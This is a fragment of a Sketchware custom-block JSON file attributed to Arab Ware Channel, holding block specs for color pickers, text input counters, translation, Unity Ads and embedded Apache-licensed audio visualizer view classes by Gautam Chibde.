b;\n  for (int i \u003d 0; i \u003c 8; i++) { \n      binary.append((val \u0026 128) \u003d\u003d 0\n? 0 : 1);\n  val \u003c\u003c\u003d 1;  }\n    binary.append(\u0027 \u0027);\n}","color":"#FF2196F3","name":"text to binary","typeName":"","palette":"181","type":" ","spec":"from text %s to binary"},{"code":"binary","color":"#FF2196F3","name":"get binary result","typeName":"","palette":"181","type":"s","spec":"get binary result"},{"code":"String biner \u003d %1$s;\nString hasil \u003d \"\"; char nextChar;\n\nfor(int i \u003d 0; i \u003c\u003d biner.length()-8; i +\u003d 9) {  nextChar \u003d (char)Integer.parseInt(biner.substring(i, i+8), 2);  hasil +\u003d nextChar; }","color":"#FF2196F3","name":"binary to text","typeName":"","palette":"181","type":" ","spec":"from binary %s to text"},{"code":"String.valueOf(hasil)","color":"#FF2196F3","name":"get text result","typeName":"","palette":"181","type":"s","spec":"get text result"},{"code":"","color":"#FF8E24AA","name":"ColorPicker ...","typeName":"","palette":"182","type":"h","spec":"By Arab Ware Channel"},{"code":"","color":"#FF8E24AA","name":"This Need A Library Watch My Tutorial","typeName":"","palette":"182","type":"h","spec":"WATCH ARAB WARE TUTORIAL شاهد شرح قناة عرب وير"},{"code":"%1$s.setColorListener(new com.skydoves.colorpickerview.listeners.ColorEnvelopeListener() {\n@Override\npublic void onColorSelected(com.skydoves.colorpickerview.ColorEnvelope envelope, boolean fromUser) {\n%2$s\n}\n});","color":"#FF8E24AA","name":"OnColorPicked","typeName":"","palette":"182","type":"c","spec":"%m.view OnColorPicked"},{"code":"envelope.getHexCode()","color":"#FF8E24AA","name":"color..String","typeName":"","palette":"182","type":"s","spec":"get color as String"},{"code":"envelope.getColor()","color":"#FF8E24AA","name":"getColor...","typeName":"Color","palette":"182","type":"v","spec":"get color"},{"code":"%1$s.setPaletteDrawable(getApplicationContext().getResources().getDrawable(R.drawable.%2$s));","color":"#FF8E24AA","name":"setPaletteDrawable","typeName":"","palette":"182","type":" ","spec":"%m.view setPaletteDrawable %m.resource"},{"code":"%1$s.setPaletteDrawable(new BitmapDrawable(getApplicationContext().getResources(), FileUtil.decodeSampleBitmapFromPath(%2$s, 1024, 1024)));","color":"#FF8E24AA","name":"setPaletteDrawable_copy46","typeName":"","palette":"182","type":" ","spec":"%m.view setPaletteDrawable from path %s"},{"code":"%1$s.setSelectorDrawable(getApplicationContext().getResources().getDrawable(R.drawable.%2$s));","color":"#FF8E24AA","name":"setSelectorDrawable","typeName":"","palette":"182","type":" ","spec":"%m.view setSelectorDrawable %m.resource"},{"code":"%1$s.setSelectorDrawable(new BitmapDrawable(getApplicationContext().getResources(), FileUtil.decodeSampleBitmapFromPath(%2$s, 1024, 1024)))","color":"#FF8E24AA","name":"setSelectorDrawable_copy26","typeName":"","palette":"182","type":" ","spec":"%m.view setSelectorDrawable from path %s"},{"code":"","color":"#FF8E24AA","name":"created....","typeName":"","palette":"183","type":"h","spec":"CREATED BY ARAB WARE CHANNEL"},{"code":"%1$s.setCounterEnabled(%2$s);","color":"#FF8E24AA","name":"set counter boolean","typeName":"","palette":"183","type":" ","spec":"%m.view setCounterEnabled %b"},{"code":"%1$s.setCounterMaxLength((int) %2$s);","color":"#FF8E24AA","name":"setCounterMaxLength..","typeName":"","palette":"183","type":" ","spec":"%m.view setCounterMaxLength %d"},{"code":"%1$s.getCounterMaxLength()","color":"#FF8E24AA","name":"getCounterMaxLength.","typeName":"","palette":"183","type":"d","spec":"%m.view getCounterMaxLength"},{"code":"%1$s.setCounterOverflowTextColor(ColorStateList.valueOf(%2$s));","color":"#FF8E24AA","name":"setCounterOverflowTextColor..","typeName":"","palette":"183","type":" ","spec":"%m.view setCounterOverflowTextColor %m.color"},{"code":"%1$s.setCounterTextColor(ColorStateList.valueOf(%2$s));","color":"#FF8E24AA","name":"setCounterTextColor ..","typeName":"","palette":"183","type":" ","spec":"%m.view setCounterTextColor %m.color"},{"code":"%1$s.setErrorEnabled(%2$s);","color":"#FF8E24AA","name":"setErrorEnabled","typeName":"","palette":"183","type":" ","spec":"%m.view setErrorEnabled %b"},{"code":"%1$s.setError(%2$s);","color":"#FF8E24AA","name":"setError..","typeName":"","palette":"183","type":" ","spec":"%m.view set Error %s"},{"code":"%1$s.setErrorIconDrawable(R.drawable.%2$s);","color":"#FF8E24AA","name":"setErrorIconDrawable...","typeName":"","palette":"183","type":" ","spec":"%m.view setErrorIconDrawable %m.resource"},{"code":"%1$s.setBoxCornerRadii((float) %2$s,(float) %3$s,(float) %4$s,(float) %5$s);\n%1$s.setBoxBackgroundMode(%1$s.BOX_BACKGROUND_OUTLINE);","color":"#FF8E24AA","name":"setBoxCornerRadii ...","typeName":"","palette":"183","type":" ","spec":"%m.view setBoxCornerRadii %d %d %d %d"},{"code":"%1$s.setBoxStrokeWidth((int) %2$s);\n%1$s.setBoxBackgroundMode(%1$s.BOX_BACKGROUND_OUTLINE);","color":"#FF8E24AA","name":"setBoxStrokeWidth...","typeName":"","palette":"183","type":" ","spec":"%m.view setBoxStrokeWidth %d"},{"code":"%1$s.setBoxStrokeColor(%2$s);\n%1$s.setBoxBackgroundMode(%1$s.BOX_BACKGROUND_OUTLINE);","color":"#FF8E24AA","name":"setBoxStrokeColor ....","typeName":"","palette":"183","type":" ","spec":"%m.view setBoxStrokeColor %m.color"},{"code":"%1$s.setHint(%2$s);","color":"#FF8E24AA","name":"setHint.....","typeName":"","palette":"183","type":" ","spec":"%m.view setHint %s"},{"code":"%1$s.setHelperText(%2$s);","color":"#FF8E24AA","name":"setHelperText","typeName":"","palette":"183","type":" ","spec":"%m.view setHelperText %s"},{"code":"","color":"#FFFF6D00","name":"added","typeName":"","palette":"184","type":"h","spec":"added by arab ware channel"},{"code":"","color":"#FFFF6D00","name":"added","typeName":"","palette":"184","type":"h","spec":"added by arab ware channel"},{"code":"TranslateAPI %1$s \u003d new TranslateAPI(\n\t\t\t\tLanguage.%2$s,\n\t\t\t\tLanguage.%3$s,\n\t\t\t\t%4$s);","color":"#FFFF6D00","name":"translate ...","typeName":"","palette":"184","type":" ","spec":"%m.TranslateAPI set language %s.inputOnly to %s.inputOnly translate %s"},{"code":"%1$s.setTranslateListener(new TranslateAPI.TranslateListener() {\n\t\t\t\t\t\t@Override\n\t\t\t\t\t\tpublic void onSuccess(String %1$sText) {\n\t\t\t%2$s\n\t\t\t\t\t\t}\n\t\t\n\t\t\t\t\t\t@Override\n\t\t\t\t\t\tpublic void onFailure(String %1$sError) {\n\t\t\t%3$s\n\t\t\t\t\t\t}\n\t\t\t\t});","color":"#FFFF6D00","typeName":"","name":"listener transltorn","palette":"184","type":"e","spec":"%m.TranslateAPI on success","spec2":"on failture"},{"code":"%1$sText","color":"#FFFF6D00","name":"get result","typeName":"","palette":"184","type":"s","spec":"%m.TranslateAPI get result"},{"code":"UnityAds.show(%1$s.this, %2$s);","color":"#FF9E9E9E","name":"show","typeName":"","palette":"185","type":" ","spec":"showInterstitialAd%m.activity placementId interstitial %s "},{"code":"UnityAds.initialize(this, %1$s, %2$s, false);","color":"#FF9E9E9E","name":"unity","typeName":"","palette":"185","type":" ","spec":"initializeUnityAds%s testMode %b  "},{"code":"","color":"#FFE65100","name":"blocks by arab ware channel","typeName":"","palette":"186","type":"h","spec":"BLOCKS BY ARAB WARE CHANNEL | AND FROM A GITHUB LIBRARY I MODDED SOME CODES TO MAKE IT WORK WITHOUT ANDROIDX AND EASY USING"},{"code":"","color":"#FFE65100","name":"library..........","typeName":"","palette":"186","type":"h","spec":"library المكتبة"},{"code":"}\r\n/**\n * Base class that contains common implementation for all\n * visualizers.\n * Created by gautam chibde on 28/10/17.\n */\n\nabstract public static class BaseVisualizer extends View {\n    protected byte[] bytes;\n    protected Paint paint;\n    protected android.media.audiofx.Visualizer visualizer;\n    protected int color \u003d Color.BLUE;\n\n    public BaseVisualizer(Context context) {\n        super(context);\n        init(null);\n        init();\n    }\n\n    public BaseVisualizer(Context context,AttributeSet attrs) {\n        super(context, attrs);\n        init(attrs);\n        init();\n    }\n\n    public BaseVisualizer(Context context,AttributeSet attrs, int defStyleAttr) {\n        super(context, attrs, defStyleAttr);\n        init(attrs);\n        init();\n    }\n\n    private void init(AttributeSet attributeSet) {\n        paint \u003d new Paint();\n    }\n\n    /**\n     * Set color to visualizer with color resource id.\n     *\n     * @param color color resource id.\n     */\n    public void setColor(int color) {\n        this.color \u003d color;\n        this.paint.setColor(this.color);\n    }\n\n    /**\n     * @deprecated will be removed in next version use {@link BaseVisualizer#setPlayer(int)} instead\n     * @param mediaPlayer MediaPlayer\n     */\n    @Deprecated\n    public void setPlayer(MediaPlayer mediaPlayer) {\n        setPlayer(mediaPlayer.getAudioSessionId());\n    }\n\n    public void setPlayer(int audioSessionId) {\n        visualizer \u003d new android.media.audiofx.Visualizer(audioSessionId);\n        visualizer.setEnabled(false);\n        visualizer.setCaptureSize(android.media.audiofx.Visualizer.getCaptureSizeRange()[1]);\n\n        visualizer.setDataCaptureListener(new android.media.audiofx.Visualizer.OnDataCaptureListener() {\n            @Override\n            public void onWaveFormDataCapture(android.media.audiofx.Visualizer visualizer, byte[] bytes,\n                                              int samplingRate) {\n                BaseVisualizer.this.bytes \u003d bytes;\n                invalidate();\n            }\n\n            @Override\n            public void onFftDataCapture(android.media.audiofx.Visualizer visualizer, byte[] bytes,\n                                         int samplingRate) {\n            }\n        }, android.media.audiofx.Visualizer.getMaxCaptureRate() / 2, true, false);\n\n        visualizer.setEnabled(true);\n    }\n\n    public void release() {\n        //will be null if setPlayer hasn\u0027t yet been called\n        if (visualizer \u003d\u003d null)\n            return;\n\n        visualizer.release();\n        bytes \u003d null;\n        invalidate();\n    }\n\n    public android.media.audiofx.Visualizer getVisualizer() {\n        return visualizer;\n    }\n\n    protected abstract void init();\n}\r\n/*\n* Copyright (C) 2017 Gautam Chibde\n*\n* Licensed under the Apache License, Version 2.0 (the \"License\");\n* you may not use this file except in compliance with the License.\n* You may obtain a copy of the License at\n*\n* http://www.apache.org/licenses/LICENSE-2.0\n*\n* Unless required by applicable law or agreed to in writing, software\n* distributed under the License is distributed on an \"AS IS\" BASIS,\n* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n* See the License for the specific language governing permissions and\n* limitations under the License.\n*/\n\n/**\n * Custom view that creates a Bar visualizer effect for\n * the android {@link android.media.MediaPlayer}\n *\n * Created by gautam chibde on 28/10/17.\n */\n\npublic static class BarVisualizer extends BaseVisualizer {\n\n    private float density \u003d 50;\n    private int gap;\n\n    public BarVisualizer(Context context) {\n        super(context);\n    }\n\n    public BarVisualizer(Context context,AttributeSet attrs) {\n        super(context, attrs);\n    }\n\n    public BarVisualizer(Context context,AttributeSet attrs,\n                         int defStyleAttr) {\n        super(context, attrs, defStyleAttr);\n    }\n\n    @Override\n    protected void init() {\n        this.density \u003d 50;\n        this.gap \u003d 4;\n        paint.setStyle(Paint.Style.FILL);\n    }\n\n    /**\n     * Sets the density to the Bar visualizer i.e the number of bars\n     * to be displayed. Density can vary from 10 to 256.\n     * by default the value is set to 50.\n     *\n     * @param density density of the bar visualizer\n     */\n    public void setDensity(float density) {\n        this.density \u003d density;\n        if (density \u003e 256) {\n            this.density \u003d 256;\n        } else if (density \u003c 10) {\n            this.density \u003d 10;\n        }\n    }\n\n    @Override\n    protected void onDraw(Canvas canvas) {\n        if (bytes !\u003d null) {\n            float barWidth \u003d getWidth() / density;\n            float div \u003d bytes.length / density;\n            paint.setStrokeWidth(barWidth - gap);\n\n            for (int i \u003d 0; i \u003c density; i++) {\n                int bytePosition \u003d (int) Math.ceil(i * div);\n                int top \u003d getHeight() +\n                        ((byte) (Math.abs(bytes[bytePosition]) + 128)) * getHeight() / 128;\n                float barX \u003d (i * barWidth) + (barWidth / 2);\n                canvas.drawLine(barX, getHeight(), barX, top, paint);\n            }\n            super.onDraw(canvas);\n        }\n    }\n}\r\n/*\n* Copyright (C) 2017 Gautam Chibde\n*\n* Licensed under the Apache License, Version 2.0 (the \"License\");\n* you may not use this file except in compliance with the License.\n* You may obtain a copy of the License at\n*\n* http://www.apache.org/licenses/LICENSE-2.0\n*\n* Unless required by applicable law or agreed to in writing, software\n* distributed under the License is distributed on an \"AS IS\" BASIS,\n* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n* See the License for the specific language governing permissions and\n* limitations under the License.\n*/\n\n/**\n * TODO\n *\n * Created by gautam chibde on 29/10/17.\n */\n\nclass BlazingColorVisualizer extends BaseVisualizer {\n    private Shader shader;\n\n    public BlazingColorVisualizer(Context context) {\n        super(context);\n    }\n\n    public BlazingColorVisualizer(Context context,\n                                  AttributeSet attrs) {\n        super(context, attrs);\n    }\n\n    public BlazingColorVisualizer(Context context,\n                                  AttributeSet attrs,\n                                  int defStyleAttr) {\n        super(context, attrs, defStyleAttr);\n    }\n\n    @Override\n    protected void init() {\n        shader \u003d new LinearGradient(0,\n                0,\n                0,\n                getHeight(),\n                Color.BLUE,\n                Color.GREEN,\n                Shader.TileMode.MIRROR /*or REPEAT*/);\n    }\n\n    @Override\n    protected void onDraw(Canvas canvas) {\n        if (bytes !\u003d null) {\n            paint.setShader(shader);\n            for (int i \u003d 0, k \u003d 0; i \u003c (bytes.length - 1) \u0026\u0026 k \u003c bytes.length; i++, k++) {\n                int top \u003d getHeight() +\n                        ((byte) (Math.abs(bytes[k]) + 128)) * getHeight() / 128;\n                canvas.drawLine(i, getHeight(), i, top, paint);\n            }\n            super.onDraw(canvas);\n        }\n    }\n}\r\n/*\n* Copyright (C) 2017 Gautam Chibde\n*\n* Licensed under the Apache License, Version 2.0 (the \"License\");\n* you may not use this file except in compliance with the License.\n* You may obtain a copy of the License at\n*\n* http://www.apache.org/licenses/LICENSE-2.0\n*\n* Unless required by applicable law or agreed to in writing, software\n* distributed under the License is distributed on an \"AS IS\" BASIS,\n* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n* See the License for the specific language governing permissions and\n* limitations under the License.\n*/\n\n\n/**\n * Custom view that creates a Circle and Bar visualizer effect for\n * the android {@link android.media.MediaPlayer}\n *\n * Created by gautam chibde on 20/11/17.\n */\n\npublic static class CircleBarVisualizer extends BaseVisualizer {\n    private float[] points;\n    private Paint circlePaint;\n    private int radius;\n\n    public CircleBarVisualizer(Context context) {\n        super(context);\n    }\n\n    public CircleBarVisualizer(Context context,\n                               AttributeSet attrs) {\n        super(context, attrs);\n    }\n\n    public CircleBarVisualizer(Context context,\n                               AttributeSet attrs,\n                               int defStyleAttr) {\n        super(context, attrs, defStyleAttr);\n    }\n\n    @Override\n    protected void init() {\n        paint.setStyle(Paint.Style.STROKE);\n        circlePaint \u003d new Paint();\n        radius \u003d -1;\n    }\n\n    @Override\n    protected void onDraw(Canvas canvas) {\n        if (radius \u003d\u003d -1) {\n            radius \u003d getHeight() \u003c getWidth() ? getHeight() : getWidth();\n            radius \u003d (int) (radius * 0.65 / 2);\n            double circumference \u003d 2 * Math.PI * radius;\n            paint.setStrokeWidth((float) (circumference / 120));\n            circlePaint.setStyle(Paint.Style.STROKE);\n            circlePaint.setStrokeWidth(4);\n        }\n        circlePaint.setColor(color);\n        canvas.drawCircle(getWidth() / 2f, getHeight() / 2f, radius, circlePaint);\n        if (bytes !\u003d null) {\n            if (points \u003d\u003d null || points.length \u003c bytes.length * 4) {\n                points \u003d new float[bytes.length * 4];\n            }\n            double angle \u003d 0;\n\n            for (int i \u003d 0; i \u003c 120; i++, angle +\u003d 3) {\n                int x \u003d (int) Math.ceil(i * 8.5);\n                int t \u003d ((byte) (-Math.abs(bytes[x]) + 128)) * (getHeight() / 4) / 128;\n\n                points[i * 4] \u003d (float) (getWidth() / 2\n                        + radius\n                        * Math.cos(Math.toRadians(angle)));\n\n                points[i * 4 + 1] \u003d (float) (getHeight() / 2\n                        + radius\n                        * Math.sin(Math.toRadians(angle)));\n\n                points[i * 4 + 2] \u003d (float) (getWidth() / 2\n                        + (radius + t)\n                        * Math.cos(Math.toRadians(angle)));\n\n                points[i * 4 + 3] \u003d (float) (getHeight() / 2\n                        + (radius + t)\n                        * Math.sin(Math.toRadians(angle)));\n            }\n\n            canvas.drawLines(points, paint);\n        }\n        super.onDraw(canvas);\n    }\n}\r\n/*\n* Copyright (C) 2017 Gautam Chibde\n*\n* Licensed under the Apache License, Version 2.0 (the \"License\");\n* you may not use this file except in compliance with the License.\n* You may obtain a copy of the License at\n*\n* http://www.apache.org/licenses/LICENSE-2.0\n*\n* Unless required by applicable law or agreed to in writing, software\n* distributed under the License is distributed on an \"AS IS\" BASIS,\n* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n* See the License for the specific language governing permissions and\n* limitations under the License.\n*/\n\n/**\n * Custom view that creates a circle visualizer effect for\n * the android {@link android.media.MediaPlayer}\n *\n * Created by gautam on 13/11/17.\n */\npublic static class CircleVisualizer extends BaseVisualizer {\n    private float[] points;\n    private float radiusMultiplier \u003d 1;\n    private float strokeWidth \u003d 0.005f;\n\n    public CircleVisualizer(Context context) {\n        super(context);\n    }\n\n    public CircleVisualizer(Context context,AttributeSet attrs) {\n        super(context, attrs);\n    }\n\n    public CircleVisualizer(Context context,AttributeSet attrs, int defStyleAttr) {\n        super(context, attrs, defStyleAttr);\n    }\n\n    @Override\n    protected void init() {\n    }\n\n    /**\n     * set Stroke width for your visualizer takes input between 1-10\n     *\n     * @param strokeWidth stroke width between 1-10\n     */\n    public void setStrokeWidth(int strokeWidth) {\n        if (strokeWidth \u003e 10) {\n            this.strokeWidth \u003d 10 * 0.005f;\n        } else if (strokeWidth \u003c 1) {\n            this.strokeWidth \u003d 0.005f;\n        }\n        this.strokeWidth \u003d strokeWidth * 0.005f;\n    }\n\n    /**\n     * This method sets the multiplier to the circle, by default the\n     * multiplier is set to 1. you can provide value more than 1 to\n     * increase size of the circle visualizer.\n     *\n     * @param radiusMultiplier multiplies to the radius of the circle.\n     */\n    public void setRadiusMultiplier(float radiusMultiplier) {\n        this.radiusMultiplier \u003d radiusMultiplier;\n    }\n\n    @Override\n    protected void onDraw(Canvas canvas) {\n        if (bytes !\u003d null) {\n            paint.setStrokeWidth(getHeight() * strokeWidth);\n            if (points \u003d\u003d null || points.length \u003c bytes.length * 4) {\n                points \u003d new float[bytes.length * 4];\n            }\n            double angle \u003d 0;\n\n            for (int i \u003d 0; i \u003c 360; i++, angle++) {\n                points[i * 4] \u003d (float) (getWidth() / 2\n                        + Math.abs(bytes[i * 2])\n                        * radiusMultiplier\n                        * Math.cos(Math.toRadians(angle)));\n                points[i * 4 + 1] \u003d (float) (getHeight() / 2\n                        + Math.abs(bytes[i * 2])\n                        * radiusMultiplier\n                        * Math.sin(Math.toRadians(angle)));\n\n                points[i * 4 + 2] \u003d (float) (getWidth() / 2\n                        + Math.abs(bytes[i * 2 + 1])\n                        * radiusMultiplier\n                        * Math.cos(Math.toRadians(angle + 1)));\n\n                points[i * 4 + 3] \u003d (float) (getHeight() / 2\n                        + Math.abs(bytes[i * 2 + 1])\n                        * radiusMultiplier\n                        * Math.sin(Math.toRadians(angle + 1)));\n            }\n            canvas.drawLines(points, paint);\n        }\n        super.onDraw(canvas);\n    }\n}\r\n/*\n* Copyright (C) 2017 Gautam Chibde\n*\n* Licensed under the Apache License, Version 2.0 (the \"License\");\n* you may not use this file except in compliance with the License.\n* You may obtain a copy of the License at\n*\n* http://www.apache.org/licenses/LICENSE-2.0\n*\n* Unless required by applicable law or agreed to in writing, software\n* distributed under the License is distributed on an \"AS IS\" BASIS,\n* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n* See the License for the specific language governing permissions and\n* limitations under the License.\n*/\n\n/**\n * Custom view that creates a Line and Bar visualizer effect for\n * the android {@link android.media.MediaPlayer}\n * \u003cp\u003e\n * Created by gautam chibde on 22/11/17.\n */\n\npublic static class LineBarVisualizer extends BaseVisualizer {\n    private Paint middleLine;\n    private float density;\n    private int gap;\n\n    public LineBarVisualizer(Context context) {\n        super(context);\n    }\n\n    public LineBarVisualizer(Context context,AttributeSet attrs) {\n        super(context, attrs);\n    }\n\n    public LineBarVisualizer(Context context,AttributeSet attrs, int defStyleAttr) {\n        super(context, attrs, defStyleAttr);\n    }\n\n    @Override\n    protected void init() {\n        density \u003d 50;\n        gap \u003d 4;\n        middleLine \u003d new Paint();\n        middleLine.setColor(Color.BLUE);\n    }\n\n    /**\n     * Sets the density to the Bar visualizer i.e the number of bars\n     * to be displayed. Density can vary from 10 to 256.\n     * by default the value is set to 50.\n     *\n     * @param density density of the bar visualizer\n     */\n    public void setDensity(float density) {\n        if (this.density \u003e 180) {\n            this.middleLine.setStrokeWidth(1);\n            this.gap \u003d 1;\n        } else {\n            this.gap \u003d 4;\n        }\n        this.density \u003d density;\n        if (density \u003e 256) {\n            this.density \u003d 250;\n            this.gap \u003d 0;\n        } else if (density \u003c\u003d 10) {\n            this.density \u003d 10;\n        }\n    }\n\n    @Override\n    protected void onDraw(Canvas canvas) {\n        if (middleLine.getColor() !\u003d Color.BLUE) {\n            middleLine.setColor(color);\n        }\n        if (bytes !\u003d null) {\n            float barWidth \u003d getWidth() / density;\n            float div \u003d bytes.length / density;\n            canvas.drawLine(0, getHeight() / 2, getWidth(), getHeight() / 2, middleLine);\n            paint.setStrokeWidth(barWidth - gap);\n\n            for (int i \u003d 0; i \u003c density; i++) {\n                int bytePosition \u003d (int) Math.ceil(i * div);\n                int top \u003d getHeight() / 2\n                        + (128 - Math.abs(bytes[bytePosition]))\n                        * (getHeight() / 2) / 128;\n\n                int bottom \u003d getHeight() / 2\n                        - (128 - Math.abs(bytes[bytePosition]))\n                        * (getHeight() / 2) / 128;\n\n                float barX \u003d (i * barWidth) + (barWidth / 2);\n                canvas.drawLine(barX, bottom, barX, getHeight() / 2, paint);\n                canvas.drawLine(barX, top, barX, getHeight() / 2, paint);\n            }\n            super.onDraw(canvas);\n        }\n    }\n}\r\n/*\n* Copyright (C) 2017 Gautam Chibde\n*\n* Licensed under the Apache License, Version 2.0 (the \"License\");\n* you may not use this file except in compliance with the License.\n* You may obtain a copy of the License at\n*\n* http://www.apache.org/licenses/LICENSE-2.0\n*\n* Unless required by applicable law or agreed to in writing, software\n* distributed under the License is distributed on an \"AS IS\" BASIS,\n* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n* See the License for the specific language governing permissions and\n* limitations under the License.\n*/\n\n\n/**\n * Custom view that creates a Bar visualizer effect for\n * the android {@link android.media.MediaPlayer}\n *\n * Created by gautam chibde on 28/10/17.\n */\n\npublic static class LineVisualizer extends BaseVisualizer {\n    private float[] points;\n    private Rect rect \u003d new Rect();\n    private float strokeWidth \u003d 0.005f;\n\n    public LineVisualizer(Context context) {\n        super(context);\n    }\n\n    public LineVisualizer(Context context,\n                          AttributeSet attrs) {\n        super(context, attrs);\n    }\n\n    public LineVisualizer(Context context,\n                           AttributeSet attrs,\n                          int defStyleAttr) {\n        super(context, attrs, defStyleAttr);\n    }\n\n    @Override\n    protected void init() {\n    }\n\n    /**\n     * set Stroke width for your visualizer takes input between 1-10\n     *\n     * @param strokeWidth stroke width between 1-10\n     */\n    public void setStrokeWidth(int strokeWidth) {\n        if (strokeWidth \u003e 10) {\n            this.strokeWidth \u003d 10 * 0.005f;\n        } else if (strokeWidth \u003c 1) {\n            this.strokeWidth \u003d 0.005f;\n        }\n        this.strokeWidth \u003d strokeWidth * 0.005f;\n    }\n\n    @Override\n    protected void onDraw(Canvas canvas) {\n        if (bytes !\u003d null) {\n            if (points \u003d\u003d null || points.length \u003c bytes.length * 4) {\n                points \u003d new float[bytes.length * 4];\n            }\n            paint.setStrokeWidth(getHeight() * strokeWidth);\n            rect.set(0, 0, getWidth(), getHeight());\n\n            for (int i \u003d 0; i \u003c bytes.length - 1; i++) {\n                points[i * 4] \u003d rect.width() * i / (bytes.length - 1);\n                points[i * 4 + 1] \u003d rect.height() / 2\n                        + ((byte) (bytes[i] + 128)) * (rect.height() / 3) / 128;\n                points[i * 4 + 2] \u003d rect.width() * (i + 1) / (bytes.length - 1);\n                points[i * 4 + 3] \u003d rect.height() / 2\n                        + ((byte) (bytes[i + 1] + 128)) * (rect.height() / 3) / 128;\n            }\n            canvas.drawLines(points, paint);\n        }\n        super.onDraw(canvas);\n    }\n}\r\n/*\n * Copyright (C) 2017 Gautam Chibde\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n * http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n\n/**\n * Custom view that creates a Bar visualizer effect for\n * the android {@link android.media.MediaPlayer}\n * \u003cp\u003e\n * Created by gautam chibde on 28/10/17.\n */\n\npublic static class SquareBarVisualizer extends BaseVisualizer {\n\n    private float density \u003d 16;\n    private int gap;\n\n    public SquareBarVisualizer(Context context) {\n        super(context);\n    }\n\n    public SquareBarVisualizer(Context context,\n                                AttributeSet attrs) {\n        super(context, attrs);\n    }\n\n    public SquareBarVisualizer(Context context,\n                                AttributeSet attrs,\n                               int defStyleAttr) {\n        super(context, attrs, defStyleAttr);\n    }\n\n    @Override\n    protected void init() {\n        this.density \u003d 16;\n        this.gap \u003d 2;\n        paint.setStyle(Paint.Style.FILL);\n    }\n\n    /**\n     * Sets the density to the Bar visualizer i.e the number of bars\n     * to be displayed. Density can vary from 10 to 256.\n     * by default the value is set to 50.\n     *\n     * @param density density of the bar visualizer\n     */\n    public void setDensity(float density) {\n        this.density \u003d density;\n        if (density \u003e 256) {\n            this.density \u003d 256;\n        } else if (density \u003c 16) {\n            this.density \u003d 16;\n        }\n    }\n\n    /**\n     * Set Spacing between the Square in visualizer in pixel.\n     *\n     * @param gap Spacing between the square\n     */\n    public void setGap(int gap) {\n        this.gap \u003d gap;\n    }\n\n    @Override\n    protected void onDraw(Canvas canvas) {\n        if (bytes !\u003d null) {\n            float barWidth \u003d getWidth() / density;\n            float div \u003d bytes.length / density;\n            paint.setStrokeWidth(barWidth - gap);\n            for (int i \u003d 0; i \u003c density; i++) {\n                int count \u003d 0;\n                int bytePosition \u003d (int) Math.ceil(i * div);\n                int top \u003d getHeight() + ((byte) (Math.abs(bytes[bytePosition]) + 128)) * getHeight() / 128;\n                int col \u003d Math.abs((getHeight() - top));\n                for (int j \u003d 0; j \u003c col + 1; j +\u003d barWidth) {\n                    float barX \u003d (i * barWidth) + (barWidth / 2);\n                    float y1 \u003d getHeight() - ((barWidth + (gap / 2f)) * count);\n                    float y2 \u003d getHeight() - ((barWidth - gap / 2f) + ((barWidth + gap / 2f) * count));\n                    canvas.drawLine(barX, y1, barX, y2, paint);\n                    count++;\n                }\n            }\n            super.onDraw(canvas);\n        }\n    }\n}\r\n{","color":"#FFE65100","name":"library...............","typeName":"","palette":"186","type":" ","spec":"put me at more block ضعني في مور بلوك"},{"code":"","color":"#FFE65100","name":"create...","typeName":"","palette":"186","type":"h","spec":"create صنع"},{"code":"%1$s.addView(new %2$s(%3$s.this));","color":"#FFE65100","name":"linear add ...","typeName":"","palette":"186","type":" ","spec":"%m.view ( linear ) add %m.typeV in %m.activity | activity only"},{"code":"%1$s.addView(new %2$s(%3$s.getActivity());","color":"#FFE65100","name":"linear add view  ....","typeName":"","palette":"186","type":" ","spec":"%m.view ( linear ) add %m.typeV in %m.activity | only fragment"},{"code":"","color":"#FFE65100","name":"typeV...","typeName":"","palette":"186","type":"h","spec":"types of typeV انواع"},{"code":"BarVisualizer","color":"#FFE65100","name":"BarVisualizer","typeName":"typeV","palette":"186","type":"v","spec":"BarVisualizer"},{"code":"CircleBarVisualizer","color":"#FFE65100","name":"CircleBarVisualizer","typeName":"typeV","palette":"186","type":"v","spec":"CircleBarVisualizer"},{"code":"CircleVisualizer","color":"#FFE65100","name":"CircleVisualizer","typeName":"typeV","palette":"186","type":"v","spec":"CircleVisualizer"},{"code":"LineBarVisualizer","color":"#FFE65100","name":"LineBarVisualizer","typeName":"typeV","palette":"186","type":"v","spec":"LineBarVisualizer"},{"code":"LineVisualizer","color":"#FFE65100","name":"LineVisualizer","typeName":"typeV","palette":"186","type":"v","spec":"LineVisualizer"},{"code":"SquareBarVisualizer","color":"#FFE65100","name":"SquareBarVisualizer","typeName":"typeV","palette":"186","type":"v","spec":"SquareBarVisualizer"},{"code":"","color":"#FFE65100","name":"public methods","typeName":"","palette":"186","type":"h","spec":"public methods الاوامر الاساسية"},{"code":"((BaseVisualizer)%1$s.getChildAt(0)).setColor(%2$s);","color":"#FFE65100","name":"setColor....","typeName":"","palette":"186","type":" ","spec":"%m.view ( linear ) %m.color"},{"code":"((BaseVisualizer)%1$s.getChildAt(0)).setPlayer(%2$s.getAudioSessionId());","color":"#FFE65100","name":"setPlayer...","typeName":"","palette":"186","type":" ","spec":"%m.view ( linear ) setPlayer %m.mediaplayer"},{"code":"","color":"#FFE65100","name":"BarVisualizer Methods","typeName":"","palette":"186","type":"h","spec":"Mathod of BarVisualizer وظائف"},{"code":"((BarVisualizer)%1$s.getChildAt(0)).setDensity((int) %2$s);","color":"#FFE65100","name":"setDensity","typeName":"","palette":"186","type":" ","spec":"%m.view ( linear ) setDensity %d"},{"code":"","color":"#FFE65100","name":"CircleVisualizer Methods","typeName":"","palette":"186","type":"h","spec":"Methods of CircleVisualizer وظائف"},{"code":"((CircleVisualizer) %1$s.getChildAt(0)).setRadiusMultiplier((float) %2$s);","color":"#FFE65100","name":"setRadiusMultiplier...","typeName":"","palette":"186","type":" ","spec":"%m.view ( 